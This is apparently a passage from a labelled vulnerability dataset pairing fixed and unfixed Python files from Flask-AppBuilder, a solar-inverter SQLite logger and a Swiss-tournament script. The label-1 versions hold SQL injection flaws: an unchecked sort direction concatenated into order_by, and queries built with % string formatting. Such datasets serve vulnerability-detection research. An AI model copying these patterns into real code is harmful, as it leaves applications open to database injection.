    def get_property_first_col(self, col_name):
        # support for only one col for pk and fk
        return self.list_properties[col_name].columns[0]

    def get_relation_fk(self, col_name):
        # support for only one col for pk and fk
        return list(self.list_properties[col_name].local_columns)[0]

    def get(self, id, filters=None):
        if filters:
            query = query = self.session.query(self.obj)
            _filters = filters.copy()
            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)
            query = self._get_base_query(query=query, filters=_filters)
            return query.first()
        return self.session.query(self.obj).get(id)

    def get_pk_name(self):
        for col_name in self.list_columns.keys():
            if self.is_pk(col_name):
                return col_name


""""""
    For Retro-Compatibility
""""""
SQLModel = SQLAInterface
/n/n/nflask_appbuilder/urltools.py/n/nimport re
from flask import request


class Stack(object):
    """"""
        Stack data structure will not insert
        equal sequential data
    """"""
    def __init__(self, list=None, size=5):
        self.size = size
        self.data = list or []

    def push(self, item):
        if self.data:
            if item != self.data[len(self.data) - 1]:
                self.data.append(item)
        else:
            self.data.append(item)
        if len(self.data) > self.size:
            self.data.pop(0)

    def pop(self):
        if len(self.data) == 0:
            return None
        return self.data.pop(len(self.data) - 1)

    def to_json(self):
        return self.data


def get_group_by_args():
    """"""
        Get page arguments for group by
    """"""
    group_by = request.args.get('group_by')
    if not group_by: group_by = ''
    return group_by


def get_page_args():
    """"""
        Get page arguments, returns a dictionary
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>

    """"""
    pages = {}
    for arg in request.args:
        re_match = re.findall('page_(.*)', arg)
        if re_match:
            pages[re_match[0]] = int(request.args.get(arg))
    return pages


def get_page_size_args():
    """"""
        Get page size arguments, returns an int
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>

    """"""
    page_sizes = {}
    for arg in request.args:
        re_match = re.findall('psize_(.*)', arg)
        if re_match:
            page_sizes[re_match[0]] = int(request.args.get(arg))
    return page_sizes


def get_order_args():
    """"""
        Get order arguments, return a dictionary
        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }

        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'

    """"""
    orders = {}
    for arg in request.args:
        re_match = re.findall('_oc_(.*)', arg)
        if re_match:
            order_direction = request.args.get('_od_' + re_match[0])
            if order_direction in ('asc', 'desc'):
                orders[re_match[0]] = (request.args.get(arg), order_direction)
    return orders


def get_filter_args(filters):
    filters.clear_filters()
    for arg in request.args:
        re_match = re.findall('_flt_(\d)_(.*)', arg)
        if re_match:
            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))
/n/n/n",0
153,153,2158db051408e0d66210a99b17c121be008e20b6,"/flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-
import sys
import logging
import sqlalchemy as sa

from . import filters
from sqlalchemy.orm import joinedload
from sqlalchemy.exc import IntegrityError
from sqlalchemy import func
from sqlalchemy.orm.properties import SynonymProperty

from ..base import BaseInterface
from ..group import GroupByDateYear, GroupByDateMonth, GroupByCol
from ..mixins import FileColumn, ImageColumn
from ...filemanager import FileManager, ImageManager
from ..._compat import as_unicode
from ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \
    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY

log = logging.getLogger(__name__)


def _include_filters(obj):
    for key in filters.__all__:
        if not hasattr(obj, key):
            setattr(obj, key, getattr(filters, key))


class SQLAInterface(BaseInterface):
    """"""
    SQLAModel
    Implements SQLA support methods for views
    """"""
    session = None

    filter_converter_class = filters.SQLAFilterConverter

    def __init__(self, obj, session=None):
        _include_filters(self)
        self.list_columns = dict()
        self.list_properties = dict()

        self.session = session
        # Collect all SQLA columns and properties
        for prop in sa.orm.class_mapper(obj).iterate_properties:
            if type(prop) != SynonymProperty:
                self.list_properties[prop.key] = prop
        for col_name in obj.__mapper__.columns.keys():
            if col_name in self.list_properties:
                self.list_columns[col_name] = obj.__mapper__.columns[col_name]
        super(SQLAInterface, self).__init__(obj)

    @property
    def model_name(self):
        """"""
            Returns the models class name
            useful for auto title on views
        """"""
        return self.obj.__name__

    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):
        if filters:
            query = filters.apply_all(query)
        if order_column != '':
            # if Model has custom decorator **renders('<COL_NAME>')**
            # this decorator will add a property to the method named *_col_name*
            if hasattr(self.obj, order_column):
                if hasattr(getattr(self.obj, order_column), '_col_name'):
                    order_column = getattr(getattr(self.obj, order_column), '_col_name')
            query = query.order_by(order_column + ' ' + order_direction)
        return query

    def query(self, filters=None, order_column='', order_direction='',
              page=None, page_size=None):
        """"""
            QUERY
            :param filters:
                dict with filters {<col_name>:<value,...}
            :param order_column:
                name of the column to order
            :param order_direction:
                the direction to order <'asc'|'desc'>
            :param page:
                the current page
            :param page_size:
                the current page size

        """"""
        query = self.session.query(self.obj)
        if len(order_column.split('.')) >= 2:
            tmp_order_column = ''
            for join_relation in order_column.split('.')[:-1]:
                model_relation = self.get_related_model(join_relation)
                query = query.join(model_relation)
                # redefine order column name, because relationship can have a different name
                # from the related table name.
                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'
            order_column = tmp_order_column + order_column.split('.')[-1]
        query_count = self.session.query(func.count('*')).select_from(self.obj)

        query_count = self._get_base_query(query=query_count,
                                           filters=filters)
        query = self._get_base_query(query=query,
                                     filters=filters,
                                     order_column=order_column,
                                     order_direction=order_direction)

        count = query_count.scalar()

        if page:
            query = query.offset(page * page_size)
        if page_size:
            query = query.limit(page_size)

        return count, query.all()

    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByCol(group_by, 'Group by')
        return group.apply(query_result)

    def query_month_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByDateMonth(group_by, 'Group by Month')
        return group.apply(query_result)

    def query_year_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group_year = GroupByDateYear(group_by, 'Group by Year')
        return group_year.apply(query_result)

    """"""
    -----------------------------------------
         FUNCTIONS for Testing TYPES
    -----------------------------------------
    """"""

    def is_image(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, ImageColumn)
        except:
            return False

    def is_file(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, FileColumn)
        except:
            return False

    def is_string(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.String)
        except:
            return False

    def is_text(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Text)
        except:
            return False

    def is_integer(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Integer)
        except:
            return False

    def is_numeric(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)
        except:
            return False

    def is_float(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Float)
        except:
            return False

    def is_boolean(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)
        except:
            return False

    def is_date(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Date)
        except:
            return False

    def is_datetime(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)
        except:
            return False

    def is_relation(self, col_name):
        try:
            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)
        except:
            return False

    def is_relation_many_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOONE'
        except:
            return False

    def is_relation_many_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOMANY'
        except:
            return False

    def is_relation_one_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOONE'
        except:
            return False

    def is_relation_one_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOMANY'
        except:
            return False

    def is_nullable(self, col_name):
        if self.is_relation_many_to_one(col_name):
            col = self.get_relation_fk(col_name)
            return col.nullable
        try:
            return self.list_columns[col_name].nullable
        except:
            return False

    def is_unique(self, col_name):
        try:
            return self.list_columns[col_name].unique
        except:
            return False

    def is_pk(self, col_name):
        try:
            return self.list_columns[col_name].primary_key
        except:
            return False

    def is_fk(self, col_name):
        try:
            return self.list_columns[col_name].foreign_keys
        except:
            return False

    def get_max_length(self, col_name):
        try:
            col = self.list_columns[col_name]
            if col.type.length:
                return col.type.length
            else:
                return -1
        except:
            return -1

    """"""
    -------------------------------
     FUNCTIONS FOR CRUD OPERATIONS
    -------------------------------
    """"""

    def add(self, item):
        try:
            self.session.add(item)
            self.session.commit()
            self.message = (as_unicode(self.add_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.add_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def edit(self, item):
        try:
            self.session.merge(item)
            self.session.commit()
            self.message = (as_unicode(self.edit_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete(self, item):
        try:
            self._delete_files(item)
            self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete_all(self, items):
        try:
            for item in items:
                self._delete_files(item)
                self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    """"""
    -----------------------
     FILE HANDLING METHODS
    -----------------------
    """"""

    def _add_files(self, this_request, item):
        fm = FileManager()
        im = ImageManager()
        for file_col in this_request.files:
            if self.is_file(file_col):
                fm.save_file(this_request.files[file_col], getattr(item, file_col))
        for file_col in this_request.files:
            if self.is_image(file_col):
                im.save_file(this_request.files[file_col], getattr(item, file_col))

    def _delete_files(self, item):
        for file_col in self.get_file_column_list():
            if self.is_file(file_col):
                if getattr(item, file_col):
                    fm = FileManager()
                    fm.delete_file(getattr(item, file_col))
        for file_col in self.get_image_column_list():
            if self.is_image(file_col):
                if getattr(item, file_col):
                    im = ImageManager()
                    im.delete_file(getattr(item, file_col))

    """"""
    ------------------------------
     FUNCTIONS FOR RELATED MODELS
    ------------------------------
    """"""

    def get_col_default(self, col_name):
        default = getattr(self.list_columns[col_name], 'default', None)
        if default is not None:
            value = getattr(default, 'arg', None)
            if value is not None:
                if getattr(default, 'is_callable', False):
                    return lambda: default.arg(None)
                else:
                    if not getattr(default, 'is_scalar', True):
                        return None
                return value

    def get_related_model(self, col_name):
        return self.list_properties[col_name].mapper.class_

    def query_model_relation(self, col_name):
        model = self.get_related_model(col_name)
        return self.session.query(model).all()

    def get_related_interface(self, col_name):
        return self.__class__(self.get_related_model(col_name), self.session)

    def get_related_obj(self, col_name, value):
        rel_model = self.get_related_model(col_name)
        return self.session.query(rel_model).get(value)

    def get_related_fks(self, related_views):
        return [view.datamodel.get_related_fk(self.obj) for view in related_views]

    def get_related_fk(self, model):
        for col_name in self.list_properties.keys():
            if self.is_relation(col_name):
                if model == self.get_related_model(col_name):
                    return col_name

    """"""
    ------------- 
     GET METHODS
    -------------
    """"""

    def get_columns_list(self):
        """"""
            Returns all model's columns on SQLA properties
        """"""
        return list(self.list_properties.keys())

    def get_user_columns_list(self):
        """"""
            Returns all model's columns except pk or fk
        """"""
        ret_lst = list()
        for col_name in self.get_columns_list():
            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):
                ret_lst.append(col_name)
        return ret_lst

    # TODO get different solution, more integrated with filters
    def get_search_columns_list(self):
        ret_lst = list()
        for col_name in self.get_columns_list():
            if not self.is_relation(col_name):
                tmp_prop = self.get_property_first_col(col_name).name
                if (not self.is_pk(tmp_prop)) and \
                        (not self.is_fk(tmp_prop)) and \
                        (not self.is_image(col_name)) and \
                        (not self.is_file(col_name)) and \
                        (not self.is_boolean(col_name)):
                    ret_lst.append(col_name)
            else:
                ret_lst.append(col_name)
        return ret_lst

    def get_order_columns_list(self, list_columns=None):
        """"""
            Returns the columns that can be ordered

            :param list_columns: optional list of columns name, if provided will
                use this list only.
        """"""
        ret_lst = list()
        list_columns = list_columns or self.get_columns_list()
        for col_name in list_columns:
            if not self.is_relation(col_name):
                if hasattr(self.obj, col_name):
                    if (not hasattr(getattr(self.obj, col_name), '__call__') or
                            hasattr(getattr(self.obj, col_name), '_col_name')):
                        ret_lst.append(col_name)
                else:
                    ret_lst.append(col_name)
        return ret_lst

    def get_file_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]

    def get_image_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]

    def get_property_first_col(self, col_name):
        # support for only one col for pk and fk
        return self.list_properties[col_name].columns[0]

    def get_relation_fk(self, col_name):
        # support for only one col for pk and fk
        return list(self.list_properties[col_name].local_columns)[0]

    def get(self, id, filters=None):
        if filters:
            query = query = self.session.query(self.obj)
            _filters = filters.copy()
            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)
            query = self._get_base_query(query=query, filters=_filters)
            return query.first()
        return self.session.query(self.obj).get(id)

    def get_pk_name(self):
        for col_name in self.list_columns.keys():
            if self.is_pk(col_name):
                return col_name


""""""
    For Retro-Compatibility
""""""
SQLModel = SQLAInterface
/n/n/n/flask_appbuilder/urltools.py/n/nimport re
from flask import request


class Stack(object):
    """"""
        Stack data structure will not insert
        equal sequential data
    """"""
    def __init__(self, list=None, size=5):
        self.size = size
        self.data = list or []

    def push(self, item):
        if self.data:
            if item != self.data[len(self.data) - 1]:
                self.data.append(item)
        else:
            self.data.append(item)
        if len(self.data) > self.size:
            self.data.pop(0)

    def pop(self):
        if len(self.data) == 0:
            return None
        return self.data.pop(len(self.data) - 1)

    def to_json(self):
        return self.data

def get_group_by_args():
    """"""
        Get page arguments for group by
    """"""
    group_by = request.args.get('group_by')
    if not group_by: group_by = ''
    return group_by

def get_page_args():
    """"""
        Get page arguments, returns a dictionary
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>

    """"""
    pages = {}
    for arg in request.args:
        re_match = re.findall('page_(.*)', arg)
        if re_match:
            pages[re_match[0]] = int(request.args.get(arg))
    return pages

def get_page_size_args():
    """"""
        Get page size arguments, returns an int
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>

    """"""
    page_sizes = {}
    for arg in request.args:
        re_match = re.findall('psize_(.*)', arg)
        if re_match:
            page_sizes[re_match[0]] = int(request.args.get(arg))
    return page_sizes

def get_order_args():
    """"""
        Get order arguments, return a dictionary
        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }

        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'

    """"""
    orders = {}
    for arg in request.args:
        re_match = re.findall('_oc_(.*)', arg)
        if re_match:
            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))
    return orders

def get_filter_args(filters):
    filters.clear_filters()
    for arg in request.args:
        re_match = re.findall('_flt_(\d)_(.*)', arg)
        if re_match:
            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))
/n/n/n",1
54,54,269b48caa05377b7c58c3e6d1622a4429cb5ba65,"util/database.py/n/n#!/usr/bin/python3
""""""
""""""
import sqlite3, pytz
from datetime import datetime, timedelta


class Database():

    def __init__(self, config):
        self.config = config
        self.db = sqlite3.connect(self.config.get_database_path(), check_same_thread=False)
        self.c = self.db.cursor()

    def add_inverters(self):
        interfaces = self.config.get_connection_interfaces()
        for source in interfaces:
            if source[""type""] == ""inverter"":

                query = '''
                    INSERT OR IGNORE INTO Inverters (
                        Serial,
                        EToday,
                        ETotal
                    ) VALUES (
                        ?,
                        ?,
                        ?
                    );
                '''
                self.c.execute(query, (source[""serial_id""], 0, source[""prev_etotal""]))

                query = '''
                    UPDATE Inverters
                    SET     
                        Name=?, 
                        Type=?, 
                        SW_Version=?, 
                        Status=?,
                        TimeStamp=?
                    WHERE Serial=?;
                '''
                self.c.execute(query, (source[""name""], source[""inverter_type""], ""s0-bridge v0"", ""OK"", int(datetime.now().timestamp()), source[""serial_id""] ))

                self.db.commit()

    def add_data(self, ts, data_points):
        for data in data_points:

            data_type = data['source']['type']

            if data_type == 'inverter':

                self.add_inverter_data(ts, data)

            elif data_type == 'consumption':

                self.add_consumption_data_row(ts, data['energy'], data['power'])

    def add_inverter_data(self, ts, data):

        inv_serial = data['source']['serial_id']
        prev_ts, prev_etoday, prev_etotal = self.get_previous_yields(inv_serial)

        status = 'OK'  # TODO: Generate actual status value

        self.add_day_data_row(ts, data, prev_etotal)

        if self.is_timestamps_from_same_day(prev_ts, ts):

            self.update_inverter(inv_serial, ts, status, prev_etoday + data['energy'],  prev_etotal + data['energy'])

        else:   # is new day

            self.update_inverter(inv_serial, ts, status, data['energy'],  prev_etotal + data['energy'])
            self.add_month_data_row(inv_serial, ts, prev_etoday, prev_etotal)

        self.db.commit()

    def add_day_data_row(self, ts, data, prev_etotal):

        if data['power'] > 0:

            inv_serial = data['source']['serial_id']
            query = '''
               INSERT INTO DayData (
                   TimeStamp,
                   Serial,
                   Power,
                   TotalYield
               ) VALUES (
                   ?,
                   ?,
                   ?,
                   ?
               );
            '''
            self.c.execute(query, (ts, inv_serial, data['power'],  prev_etotal + data['energy']))


    def get_previous_yields(self, inverter_serial):
        query = '''
           SELECT TimeStamp, EToday, ETotal
           FROM Inverters
           WHERE Serial=?
        '''
        self.c.execute(query, (inverter_serial,))
        data = self.c.fetchone()
        return data[0], data[1], data[2]

    def update_inverter(self, inverter_serial, ts, status, etoday, etotal):
        query = '''
            UPDATE Inverters
            SET     
                TimeStamp=?, 
                Status=?, 
                eToday=?,
                eTotal=?
            WHERE Serial=?;
        '''
        self.c.execute(query, (ts, status, etoday, etotal, inverter_serial))

    def add_month_data_row(self, inverter_serial, ts, etoday, etotal):

        y = datetime.fromtimestamp(ts) - timedelta(days=1)
        y_ts = int(datetime(y.year, y.month, y.day, 23, tzinfo=pytz.utc).timestamp())

        query = '''
            INSERT INTO MonthData (
                TimeStamp,
                Serial,
                DayYield,
                TotalYield                                 
            ) VALUES (
                ?,
                ?,
                ?,
                ?
            );
        '''
        self.c.execute(query, (y_ts, inverter_serial, etoday, etotal))

    def add_consumption_data_row(self, ts, energy_used, power_used):

        if power_used > 0:

            query = '''
                INSERT OR IGNORE INTO Consumption (
                    TimeStamp,
                    EnergyUsed,
                    PowerUsed                                
                ) VALUES (
                    ?,
                    ?,
                    ?
                );
            '''
            self.c.execute(query, (ts, 0, 0))

            query = '''
                UPDATE Consumption SET 
                EnergyUsed = EnergyUsed + ?,
                PowerUsed = PowerUsed + ?
                WHERE TimeStamp=?;
            '''

            self.c.execute(query, (energy_used, power_used, ts))

            self.db.commit()


    def is_timestamps_from_same_day(self, ts1, ts2):
        d1 = datetime.fromtimestamp(ts1)
        d2 = datetime.fromtimestamp(ts2)
        return (d1.year == d2.year and d1.month == d2.month and d1.day == d2.day)

    def close(self):
        self.db.close()

if __name__ == '__main__':
    #print('nothing to do here')

    import random, time
    from config import Config

    cfg = Config(config_path='../config.json')
    db  = Database(cfg)

    db.add_inverters()

    test_ts = 1535932800

    print(test_ts)

    while True:

        test_ts += 300
        test_date = datetime.fromtimestamp(test_ts)

        if test_date.hour in range(0, 8) or test_date.hour in range(18, 24): continue

        watts = random.randint(50, 400)
        test_data = [
            {
                'energy': int(watts),
                'power': int(watts / 5*60),
                'source': {
                    ""serial_id"": ""1000000001"",
                    ""name"": ""TEST PLANT"",
                    ""type"": ""inverter"",
                    ""prev_etotal"": 62,
                    ""pulses_per_kwh"": 1000
                }
            },
            {
                'energy': int(watts),
                'power': int(watts / 5 * 60),
                'source': {
                    ""serial_id"": ""1000000002"",
                    ""name"": ""TEST CONSUMPTION COUNTER"",
                    ""type"": ""consumption""
                }
            }
        ]

        db.add_data(test_ts, test_data)
        print(test_date.strftime(""%y-%m-%d %H:%M:%S""), '\t', test_ts, '\t', test_data[0]['energy'], '\t', test_data[0]['power'])

        time.sleep(0.1)





/n/n/n",0
55,55,269b48caa05377b7c58c3e6d1622a4429cb5ba65,"/util/database.py/n/n#!/usr/bin/python3
""""""
""""""
import sqlite3, pytz
from datetime import datetime, timedelta


class Database():

    def __init__(self, config):
        self.config = config
        self.db = sqlite3.connect(self.config.get_database_path(), check_same_thread=False)
        self.c = self.db.cursor()

    def add_inverters(self):
        interfaces = self.config.get_connection_interfaces()
        for source in interfaces:
            if source[""type""] == ""inverter"":

                query = '''
                    INSERT OR IGNORE INTO Inverters (
                        Serial,
                        EToday,
                        ETotal
                    ) VALUES (
                        %s,
                        %s,
                        %s
                    );
                ''' % (source[""serial_id""], 0, source[""prev_etotal""])
                self.c.execute(query)

                query = '''
                    UPDATE Inverters
                    SET     
                        Name='%s', 
                        Type='%s', 
                        SW_Version='%s', 
                        Status='%s',
                        TimeStamp='%s'
                    WHERE Serial='%s';
                ''' % (source[""name""], source[""inverter_type""], ""s0-bridge v0"", ""OK"", int(datetime.now().timestamp()), source[""serial_id""] )
                self.c.execute(query)

                self.db.commit()

    def add_data(self, ts, data_points):
        for data in data_points:

            data_type = data['source']['type']

            if data_type == 'inverter':

                self.add_inverter_data(ts, data)

            elif data_type == 'consumption':

                self.add_consumption_data_row(ts, data['energy'], data['power'])

    def add_inverter_data(self, ts, data):

        inv_serial = data['source']['serial_id']
        prev_ts, prev_etoday, prev_etotal = self.get_previous_yields(inv_serial)

        status = 'OK'  # TODO: Generate actual status value

        self.add_day_data_row(ts, data, prev_etotal)

        if self.is_timestamps_from_same_day(prev_ts, ts):

            self.update_inverter(inv_serial, ts, status, prev_etoday + data['energy'],  prev_etotal + data['energy'])

        else:   # is new day

            self.update_inverter(inv_serial, ts, status, data['energy'],  prev_etotal + data['energy'])
            self.add_month_data_row(inv_serial, ts, prev_etoday, prev_etotal)

        self.db.commit()

    def add_day_data_row(self, ts, data, prev_etotal):

        if data['power'] > 0:

            inv_serial = data['source']['serial_id']
            query = '''
               INSERT INTO DayData (
                   TimeStamp,
                   Serial,
                   Power,
                   TotalYield
               ) VALUES (
                   %s,
                   %s,
                   %s,
                   %s
               );
            ''' % (ts, inv_serial, data['power'],  prev_etotal + data['energy'])
            self.c.execute(query)


    def get_previous_yields(self, inverter_serial):
        query = '''
           SELECT TimeStamp, EToday, ETotal
           FROM Inverters
           WHERE Serial = '%s'
        ''' % (inverter_serial)
        self.c.execute(query)
        data = self.c.fetchone()
        return data[0], data[1], data[2]

    def update_inverter(self, inverter_serial, ts, status, etoday, etotal):
        query = '''
            UPDATE Inverters
            SET     
                TimeStamp='%s', 
                Status='%s', 
                eToday='%s',
                eTotal='%s'
            WHERE Serial='%s';
        ''' % (ts, status, etoday, etotal, inverter_serial)
        self.c.execute(query)

    def add_month_data_row(self, inverter_serial, ts, etoday, etotal):

        y = datetime.fromtimestamp(ts) - timedelta(days=1)
        y_ts = int(datetime(y.year, y.month, y.day, 23, tzinfo=pytz.utc).timestamp())

        query = '''
            INSERT INTO MonthData (
                TimeStamp,
                Serial,
                DayYield,
                TotalYield                                 
            ) VALUES (
                %s,
                %s,
                %s,
                %s
            );
        ''' % (y_ts, inverter_serial, etoday, etotal)
        self.c.execute(query)

    def add_consumption_data_row(self, ts, energy_used, power_used):

        if power_used > 0:

            query = '''
                INSERT OR IGNORE INTO Consumption (
                    TimeStamp,
                    EnergyUsed,
                    PowerUsed                                
                ) VALUES (
                    %s,
                    %s,
                    %s
                );
            ''' % (ts, 0, 0)
            self.c.execute(query)

            query = '''
                UPDATE Consumption SET 
                EnergyUsed = EnergyUsed + %s,
                PowerUsed = PowerUsed + %s
                WHERE TimeStamp = %s;
            ''' % (energy_used, power_used, ts)

            self.c.execute(query)

            self.db.commit()


    def is_timestamps_from_same_day(self, ts1, ts2):
        d1 = datetime.fromtimestamp(ts1)
        d2 = datetime.fromtimestamp(ts2)
        return (d1.year == d2.year and d1.month == d2.month and d1.day == d2.day)

    def close(self):
        self.db.close()

if __name__ == '__main__':
    #print('nothing to do here')

    import random, time
    from config import Config

    cfg = Config(config_path='../config.json')
    db  = Database(cfg)

    db.add_inverters()

    test_ts = 1535932800

    print(test_ts)

    while True:

        test_ts += 300
        test_date = datetime.fromtimestamp(test_ts)

        if test_date.hour in range(0, 8) or test_date.hour in range(18, 24): continue

        watts = random.randint(50, 400)
        test_data = [
            {
                'energy': int(watts),
                'power': int(watts / 5*60),
                'source': {
                    ""serial_id"": ""1000000001"",
                    ""name"": ""TEST PLANT"",
                    ""type"": ""inverter"",
                    ""prev_etotal"": 62,
                    ""pulses_per_kwh"": 1000
                }
            },
            {
                'energy': int(watts),
                'power': int(watts / 5 * 60),
                'source': {
                    ""serial_id"": ""1000000002"",
                    ""name"": ""TEST CONSUMPTION COUNTER"",
                    ""type"": ""consumption""
                }
            }
        ]

        db.add_data(test_ts, test_data)
        print(test_date.strftime(""%y-%m-%d %H:%M:%S""), '\t', test_ts, '\t', test_data[0]['energy'], '\t', test_data[0]['power'])

        time.sleep(0.1)





/n/n/n",1
130,130,00f3caeed0e12e806c2808d100908698777d9e98,"tournament.py/n/n#!/usr/bin/env python
#
# tournament.py -- implementation of a Swiss-system tournament
#

import psycopg2


def connect():
    """"""Connect to the PostgreSQL database.  Returns a database connection.""""""
    return psycopg2.connect(""dbname=tournament"")


def deleteMatches():
    """"""Remove all the match records from the database.""""""
    db = connect()
    c = db.cursor()
    c.execute(""DELETE FROM matches;"")
    db.commit()
    db.close


def deletePlayers():
    """"""Remove all the player records from the database.""""""
    deleteMatches()
    db = connect()
    c = db.cursor()
    c.execute(""DELETE FROM players;"")
    db.commit()
    db.close


def countPlayers():
    """"""Returns the number of players currently registered.""""""
    db = connect()
    c = db.cursor()
    c.execute(""SELECT COUNT(*) FROM players;"")
    rows = c.fetchone()
    db.close
    return rows[0]


def registerPlayer(name):
    """"""Adds a player to the tournament database.

    The database assigns a unique serial id number for the player.  (This
    should be handled by your SQL database schema, not in your Python code.)

    Args:
      name: the player's full name (need not be unique).
    """"""

    db = connect()
    c = db.cursor()
    c.execute(""INSERT INTO players (name) values (%s)"", name)
    db.commit()
    db.close()


def playerStandings():
    """"""Returns a list of the players and their win records, sorted by wins.

    The first entry in the list should be the player in first place, or a player
    tied for first place if there is currently a tie.

    Returns:
      A list of tuples, each of which contains (id, name, wins, matches):
        id: the player's unique id (assigned by the database)
        name: the player's full name (as registered)
        wins: the number of matches the player has won
        matches: the number of matches the player has played
    """"""
    db = connect()
    c = db.cursor()
    c.execute(""SELECT * FROM standings"")
    rows = c.fetchall()
    db.close()
    return rows


def reportMatch(winner, loser):
    """"""Records the outcome of a single match between two players.

    Args:
      winner:  the id number of the player who won
      loser:  the id number of the player who lost
    """"""
    try:
        int(winner)
        int(loser)
    except ValueError:
        raise ValueError(
            ""\""winner\"" and/or \""loser\"" input are not integers.\n""
            ""Please use the id number of each player to report match results.""
        )
    w = str(winner)
    l = str(loser)
    db = connect()
    c = db.cursor()
    c.execute(""INSERT INTO matches values (%s, %s)"", (w,l))
    db.commit()
    db.close()


def swissPairings():
    """"""Returns a list of pairs of players for the next round of a match.

    Assuming that there are an even number of players registered, each player
    appears exactly once in the pairings.  Each player is paired with another
    player with an equal or nearly-equal win record, that is, a player adjacent
    to him or her in the standings.

    Returns:
      A list of tuples, each of which contains (id1, name1, id2, name2)
        id1: the first player's unique id
        name1: the first player's name
        id2: the second player's unique id
        name2: the second player's name
    """"""
    db = connect()
    c = db.cursor()
    c.execute(""SELECT * FROM pairup;"")
    rows = c.fetchall()
    db.close()
    return list(reversed(rows))
/n/n/n",0
131,131,00f3caeed0e12e806c2808d100908698777d9e98,"/tournament.py/n/n#!/usr/bin/env python
#
# tournament.py -- implementation of a Swiss-system tournament
#

import psycopg2


def connect():
